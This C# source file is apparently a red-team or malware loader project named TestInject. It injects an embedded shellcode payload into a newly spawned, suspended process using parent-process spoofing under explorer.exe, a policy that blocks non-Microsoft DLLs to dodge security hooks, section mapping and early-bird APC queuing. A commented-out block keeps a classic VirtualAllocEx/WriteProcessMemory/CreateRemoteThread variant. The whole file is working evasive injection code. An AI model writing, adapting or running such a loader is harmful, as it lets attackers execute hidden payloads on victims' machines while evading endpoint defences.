using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using DInvoke.DynamicInvoke;

namespace TestInject
{
    internal class Program
    {


        //https://rastamouse.me/d-invoke-gadgettojscript/
        static void Main(string[] args)
        {
            //try
            //{
                var startupInfoEx = new STARTUPINFOEX();
                
                _ = DInvoke.DynamicInvoke.Process.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);

                const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
                const int MITIGATION_POLICY = 0x20007;

                var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));

                _ = DInvoke.DynamicInvoke.Process.UpdateProcThreadAttribute(
                    ref startupInfoEx.lpAttributeList,
                    (IntPtr)MITIGATION_POLICY,
                    ref blockDllPtr);

                const int PARENT_PROCESS = 0x00020000;

                var ppidPtr = Marshal.AllocHGlobal(IntPtr.Size);
                var hParent = System.Diagnostics.Process.GetProcessesByName("explorer")[0].Handle;
                Marshal.WriteIntPtr(ppidPtr, hParent);

                _ = DInvoke.DynamicInvoke.Process.UpdateProcThreadAttribute(
                    ref startupInfoEx.lpAttributeList,
                    (IntPtr)PARENT_PROCESS,
                    ref ppidPtr);


                const uint CREATE_SUSPENDED = 0x00000004;
                const uint DETACHED_PROCESS = 0x00000008;
                const uint CREATE_NO_WINDOW = 0x08000000;
                const uint EXTENDED_STARTUP_INFO_PRESENT = 0x00080000;


                var result = DInvoke.DynamicInvoke.Process.CreateProcess(
                    null,
                    Properties.Resources.Host,
                    CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUP_INFO_PRESENT,
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ref startupInfoEx,
                    out var processInfo);

                DInvoke.DynamicInvoke.Process.DeleteProcThreadAttributeList(ref startupInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(ppidPtr);
                Marshal.FreeHGlobal(blockDllPtr);

                var procId = processInfo.dwProcessId;
                if (procId == 0)
                    throw new InvalidOperationException("Process was not created");

                byte[] shellcode = Properties.Resources.Payload;

                const uint GENERIC_ALL = 0x10000000;
                const uint PAGE_EXECUTE_READWRITE = 0x40;
                const uint SEC_COMMIT = 0x08000000;

                var hLocalSection = IntPtr.Zero;
                var maxSize = (ulong)shellcode.Length;

                var status = Native.NtCreateSection(
                    ref hLocalSection,
                    GENERIC_ALL,
                    IntPtr.Zero,
                    ref maxSize,
                    PAGE_EXECUTE_READWRITE,
                    SEC_COMMIT,
                    IntPtr.Zero);

                const uint PAGE_READWRITE = 0x04;

                var self = System.Diagnostics.Process.GetCurrentProcess();
                var hLocalBaseAddress = IntPtr.Zero;

                status = Native.NtMapViewOfSection(
                    hLocalSection,
                    self.Handle,
                    ref hLocalBaseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref maxSize,
                    2,
                    0,
                    PAGE_READWRITE);

                const uint PAGE_EXECUTE_READ = 0x20;

                var hRemoteBaseAddress = IntPtr.Zero;

                status = Native.NtMapViewOfSection(
                    hLocalSection,
                    processInfo.hProcess,
                    ref hRemoteBaseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref maxSize,
                    2,
                    0,
                    PAGE_EXECUTE_READ);

                Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);

                var res = DInvoke.DynamicInvoke.Process.NtQueueApcThread(
                processInfo.hThread,
                hRemoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

                _ = DInvoke.DynamicInvoke.Process.NtResumeThread(processInfo.hThread);

                int i = 0;

                /*var procRes = CreateProcess(Properties.Resources.Host);
                if (!procRes.HasValue)
                    throw new InvalidOperationException($"Failed to create process, error code: {Marshal.GetLastWin32Error()}");


                Process process = Process.GetProcessById(procRes.Value);
                IntPtr pHandle = process.Handle;

                var shellcode = Properties.Resources.Payload;


                var baseAddress = Native.Kernel32.VirtualAllocEx(
                    pHandle,
                    IntPtr.Zero,
                    shellcode.Length,
                    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                    Native.Kernel32.MemoryProtection.ReadWrite);

                if (baseAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");


                IntPtr bytesWritten = IntPtr.Zero;
                if (!Native.Kernel32.WriteProcessMemory(pHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                    throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");

                if (bytesWritten.ToInt32() != shellcode.Length)
                    throw new InvalidOperationException($"Failed to write All the shellcode into the process");

                if (!Native.Kernel32.VirtualProtectEx(
                    pHandle,
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");

                IntPtr threadres = IntPtr.Zero;

                IntPtr thread = Native.Kernel32.CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

                if (thread == IntPtr.Zero)
                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");

                //Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);*/
            //}
            //catch (InvalidOperationException e)
            //{
            //    Debug.WriteLine(e.Message);
            //}
            //finally
            //{
            //    //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            //}

            Thread.Sleep(1000);


        }

    }
}
